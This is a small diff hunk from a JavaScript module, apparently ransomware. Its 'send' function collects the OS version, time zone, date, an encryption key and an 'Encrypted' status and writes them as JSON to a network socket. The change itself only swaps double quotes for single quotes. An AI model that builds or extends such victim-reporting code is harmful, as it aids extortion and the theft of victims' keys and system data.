@@ -27,9 +27,9 @@ module.exports.send = function () {
 					OS: os.version(),
 					TimeZone: String(result.Response.TimeZone),
 					DateTime: dateTime(),
-					Price: "0$",
+					Price: '0$',
 					Key: keyData.key,
-					Status: "Encrypted"
+					Status: 'Encrypted'
 				};
 
 				client.write(JSON.stringify(dataObject));
